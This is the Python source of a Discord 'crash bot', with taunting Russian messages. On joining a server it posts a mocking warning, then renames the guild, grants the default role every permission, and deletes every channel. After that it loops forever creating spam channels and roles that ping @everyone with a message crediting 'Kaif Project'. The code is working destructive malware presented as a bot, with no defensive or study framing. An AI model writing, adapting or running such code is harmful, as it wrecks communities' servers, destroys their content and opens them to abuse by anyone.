import discord
from discord.ext import commands
from discord import Permissions
import time
import os
token = os.environ.get('TOKENZ')

class MyClient(discord.Client):
    async def on_guild_join(self, guild):
        a = 0
        for i in guild.text_channels:
            if a == 0:
                await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец через 3 секунды. Удачи :D')
                a = 1
        time.sleep(3)
        await guild.edit(name='__...-<<CRASHED>>-...__')
        await guild.default_role.edit(permissions=Permissions.all())

        for i in guild.channels:
            await i.delete()
            print('Канал', i, 'удалён!')

        while True:
            a = await guild.create_text_channel(name='66666666666666666666')
            await a.send('@everyone Сервер был крашнут ботом Kaif Project.')
            await guild.create_voice_channel(name='66666666666666666666')
            await guild.create_role(name='66666666666666666666')



client = MyClient()
client.run(str(token))
